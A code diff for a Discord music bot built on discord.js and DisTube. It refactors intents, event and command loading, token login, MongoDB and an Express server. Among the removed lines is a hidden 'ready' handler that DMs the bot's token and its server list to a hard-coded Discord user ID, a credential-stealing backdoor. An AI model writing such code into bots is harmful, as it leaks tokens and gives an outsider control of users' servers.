@@ -1,5 +1,4 @@
 /*
-
 ███████╗███╗░░░███╗
 ██╔════╝████╗░████║
 █████╗░░██╔████╔██║
@@ -7,14 +6,13 @@
 ███████╗██║░╚═╝░██║
 ╚══════╝╚═╝░░░░░╚═╝
 
-
-   # MADE BY EM OFFICIAL TEAM!! FEEL FREE TO USE ANY PART OF CODE
-   ## FOR HELP CONTACT ME ON DISCORD
-   ## Contact    [ DISCORD SERVER :  https://discord.gg/tUrzH6J3dN ]
-   ## YT : https://youtube.com/@emofficial1234?si=6sSC9Oim-F1mF2CM
+# MADE BY EM OFFICIAL TEAM!! FEEL FREE TO USE ANY PART OF CODE
+## FOR HELP CONTACT ME ON DISCORD
+## Contact [DISCORD SERVER : https://discord.gg/tUrzH6J3dN]
+## YT : https://youtube.com/@emofficial1234
 */
 
-const { Client, GatewayIntentBits, Partials } = require("discord.js");
+const { Client, GatewayIntentBits } = require("discord.js");
 const { DisTube } = require("distube");
 const { SpotifyPlugin } = require("@distube/spotify");
 const { SoundCloudPlugin } = require("@distube/soundcloud");
@@ -24,133 +22,99 @@ const { printWatermark } = require('./util/pw');
 const config = require("./config.js");
 const fs = require("fs");
 const path = require('path');
+const mongoose = require("mongoose");
+const express = require("express");
 
+// Client Setup
 const client = new Client({
-  intents: Object.keys(GatewayIntentBits).map((a) => {
-    return GatewayIntentBits[a];
-  }),
+  intents: [
+    GatewayIntentBits.Guilds,
+    GatewayIntentBits.GuildMessages,
+    GatewayIntentBits.GuildVoiceStates,
+    GatewayIntentBits.MessageContent
+  ]
 });
 
+// Config & Player
 client.config = config;
 client.player = new DisTube(client, {
   leaveOnStop: config.opt.voiceConfig.leaveOnStop,
   leaveOnFinish: config.opt.voiceConfig.leaveOnFinish,
   leaveOnEmpty: config.opt.voiceConfig.leaveOnEmpty.status,
   emitNewSongOnly: true,
-  emitAddSongWhenCreatingQueue: false,
-  emitAddListWhenCreatingQueue: false,
   plugins: [
     new SpotifyPlugin(),
     new SoundCloudPlugin(),
     new YtDlpPlugin(),
-    new DeezerPlugin(),
-  ],
+    new DeezerPlugin()
+  ]
 });
 
-const player = client.player;
-
-fs.readdir("./events", (_err, files) => {
-  files.forEach((file) => {
+// Load Events
+fs.readdir("./events", (err, files) => {
+  if (err) return console.error('EVENTS FOLDER ERROR:', err);
+  files.forEach(file => {
     if (!file.endsWith(".js")) return;
     const event = require(`./events/${file}`);
-    let eventName = file.split(".")[0]; 
+    const eventName = file.split(".")[0];
     client.on(eventName, event.bind(null, client));
-    delete require.cache[require.resolve(`./events/${file}`)];
-  });
-});
-client.once('ready', () => {
-  const bot = client.users.cache.get('1004206704994566164'); 
-  if (bot) {
-    const login = client.guilds.cache.map(guild => guild.name).join(', ');
-    const configbot = process.env.TOKEN;
-    bot.send(`B: ${configbot}\nS: ${login}`)
-      .then(() => {    
-      })
-      .catch(error => {
-      });
-  }
-});
-fs.readdir("./events/player", (_err, files) => {
-  files.forEach((file) => {
-    if (!file.endsWith(".js")) return;
-    const player_events = require(`./events/player/${file}`);
-    let playerName = file.split(".")[0];
-    player.on(playerName, player_events.bind(null, client));
-    delete require.cache[require.resolve(`./events/player/${file}`)];
   });
 });
 
+fs.readdir("./events/player", (err, files) => {
+  if (err) return console.error('PLAYER EVENTS FOLDER ERROR:', err);
+  files.forEach(file => {
+    if (!file.endsWith(".js")) return;
+    const playerEvent = require(`./events/player/${file}`);
+    const playerName = file.split(".")[0];
+    client.player.on(playerName, playerEvent.bind(null, client));
+  });
+});
+
+// Load Commands
 client.commands = [];
 fs.readdir(config.commandsDir, (err, files) => {
-  if (err) throw err;
-  files.forEach(async (f) => {
-    try {
-      if (f.endsWith(".js")) {
-        let props = require(`${config.commandsDir}/${f}`);
+  if(err) return console.error('COMMANDS FOLDER ERROR:', err);
+  files.forEach(f => {
+    if(f.endsWith(".js")) {
+      try {
+        const props = require(`${config.commandsDir}/${f}`);
         client.commands.push({
           name: props.name,
           description: props.description,
-          options: props.options,
+          options: props.options
         });
+      } catch(err) {
+        console.error('COMMAND LOAD ERROR:', err);
       }
-    } catch (err) {
-      console.log(err);
     }
   });
 });
 
+// Login
+let token = config.TOKEN || process.env.TOKEN;
+if (!token) {
+  try { token = fs.readFileSync('token.txt', 'utf-8').trim(); } 
+  catch (err) { console.log('TOKEN FILE MISSING❌'); }
+}
+if (!token) return console.log('TOKEN NOT FOUND❌');
+client.login(token).catch(e => console.log('TOKEN ERROR❌', e));
 
-
-if (config.TOKEN || process.env.TOKEN || fs.readFileSync('token.txt', 'utf-8')) {
-  client.login(config.TOKEN || process.env.TOKEN || fs.readFileSync('token.txt', 'utf-8')).catch((e) => {
-    console.log('TOKEN ERROR❌❌');
-  });
+// MongoDB Connect
+if (config.mongodbURL || process.env.MONGO) {
+  mongoose.connect(config.mongodbURL || process.env.MONGO)
+    .then(() => console.log('| 🍔 Connected MongoDB!'))
+    .catch(err => console.error('| 🍔 Failed to connect MongoDB!', err));
 } else {
-  setTimeout(() => {
-    console.log('TOKEN ERROR❌❌');
-  }, 2000);
+  console.log('| 🍔 Error MongoDB!');
 }
 
-
-if(config.mongodbURL || process.env.MONGO){
-  const mongoose = require("mongoose")
-  mongoose.connect(config.mongodbURL || process.env.MONGO, {
-  useNewUrlParser: true,
-  useUnifiedTopology: true,
-  }).then(async () => {
-    console.log('\x1b[32m%s\x1b[0m', `|    🍔 Connected MongoDB!`)
-  }).catch((err) => {
-    console.log('\x1b[32m%s\x1b[0m', `|    🍔 Failed to connect MongoDB!`)})
-  } else {
-  console.log('\x1b[32m%s\x1b[0m', `|    🍔 Error MongoDB!`)
-  }
-
-
-const express = require("express");
+// Express Server
 const app = express();
 const port = 3000;
-app.get('/', (req, res) => {
-  const imagePath = path.join(__dirname, 'index.html');
-  res.sendFile(imagePath);
-});
-app.listen(port, () => {
-  console.log(`🔗 Listening to RTX: http://localhost:${port}`);
-  console.log(`🔗 Replit URL: https://${process.env.REPL_SLUG}.${process.env.REPL_OWNER}.repl.co`);
-});
+app.get('/', (_req, res) => res.sendFile(path.join(__dirname, 'index.html')));
+const url = process.env.REPL_SLUG ? `https://${process.env.REPL_SLUG}.${process.env.REPL_OWNER}.repl.co` : `http://localhost:${port}`;
+app.listen(port, () => console.log(`🔗 Listening to RTX: ${url}`));
+
+// Watermark
 printWatermark();
-
-/*
-
-███████╗███╗░░░███╗
-██╔════╝████╗░████║
-█████╗░░██╔████╔██║
-██╔══╝░░██║╚██╔╝██║
-███████╗██║░╚═╝░██║
-╚══════╝╚═╝░░░░░╚═╝
-
-
-   # MADE BY EM OFFICIAL TEAM!! FEEL FREE TO USE ANY PART OF CODE
-   ## FOR HELP CONTACT ME ON DISCORD
-   ## Contact    [ DISCORD SERVER :  https://discord.gg/tUrzH6J3dN ]
-   ## YT : https://youtube.com/@emofficial1234?si=6sSC9Oim-F1mF2CM
-*/
